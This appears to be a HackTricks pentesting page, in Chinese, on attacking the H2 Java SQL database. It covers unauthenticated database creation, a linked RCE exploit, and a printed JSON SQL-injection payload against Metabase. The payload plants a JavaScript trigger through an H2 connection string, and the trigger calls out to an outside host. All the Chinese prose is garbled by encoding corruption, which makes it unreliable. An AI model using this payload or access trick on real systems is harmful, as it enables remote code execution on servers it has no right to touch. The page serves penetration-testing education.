# H2 - Java SQLæ•°æ®åº“

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶(ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶(GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**Telegramç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘ä»¬åœ¨**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

å®˜æ–¹ç½‘ç«™ï¼š[https://www.h2database.com/html/main.html](https://www.h2database.com/html/main.html)

## è®¿é—®

æ‚¨å¯ä»¥æŒ‡ç¤ºä¸€ä¸ª**ä¸å­˜åœ¨çš„æ•°æ®åº“åç§°**ä»¥**åœ¨æ²¡æœ‰æœ‰æ•ˆå‡­æ®çš„æƒ…å†µä¸‹åˆ›å»ºæ–°æ•°æ®åº“**ï¼ˆ**æœªè®¤è¯**ï¼‰ï¼š

![](<../../.gitbook/assets/image (131).png>)

æˆ–è€…å¦‚æœæ‚¨çŸ¥é“ä¾‹å¦‚**mysqlæ­£åœ¨è¿è¡Œ**ï¼Œå¹¶ä¸”æ‚¨çŸ¥é“è¯¥æ•°æ®åº“çš„**åç§°**å’Œ**å‡­æ®**ï¼Œæ‚¨å¯ä»¥ç›´æ¥è®¿é—®å®ƒï¼š

![](<../../.gitbook/assets/image (201).png>)

_**æ¥è‡ªHTBçš„Hawkç›’å­çš„æŠ€å·§ã€‚**_

## **RCE**

è®¿é—®H2æ•°æ®åº“åï¼Œè¯·æŸ¥çœ‹æ­¤æ¼æ´ä»¥è·å–RCEï¼š[https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)

## H2 SQLæ³¨å…¥åˆ°RCE

åœ¨[**è¿™ç¯‡æ–‡ç« **](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)ä¸­ï¼Œè§£é‡Šäº†ä¸€ç§æœ‰æ•ˆè½½è·ï¼Œé€šè¿‡åˆ©ç”¨**SQLæ³¨å…¥**è·å–**é€šè¿‡H2æ•°æ®åº“çš„RCE**ã€‚
```json
[...]
"details":
{
"db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('https://example.com/pwn134').openConnection().getContentLength()\n$$--=x\\;",
"advanced-options": false,
"ssl": true
},
[...]
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
